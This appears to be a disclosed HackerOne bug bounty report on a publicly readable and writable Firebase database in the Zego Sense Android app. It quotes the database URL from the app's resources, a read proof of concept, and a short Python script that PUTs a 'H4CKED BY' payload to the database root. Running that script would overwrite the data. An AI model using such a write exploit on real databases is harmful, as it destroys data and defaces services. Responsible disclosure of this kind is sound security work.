# Firebase Database Takeover in Zego Sense Android app

## Report Details
- **Report ID**: 1065134
- **URL**: https://hackerone.com/reports/1065134
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-23T13:45:53.246Z
- **Disclosed**: 2021-06-23T16:04:36.189Z

## Reporter
- **Username**: sheikhrishad0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zego

## Vulnerability Information
Hello Team,

Summary:
publicly available Firebase Database (api-project-615509201590.firebaseio.com)

Platform Affected: [android]
com.zegocover.zego

Steps To Reproduce:

in res/values/strings.xml

    <string name="firebase_database_url">https://api-project-615509201590.firebaseio.com</string>

POC:

    Go to https://api-project-615509201590.firebaseio.com/.json

{F1127099}

Exploit:

    import requests
    data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
    reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)


References:


There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

Regards,
Sheikh Rishad

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.

So please immediately change the rule of the database to private so that nobody can able to access it outside.

## Attachments
- poc.PNG
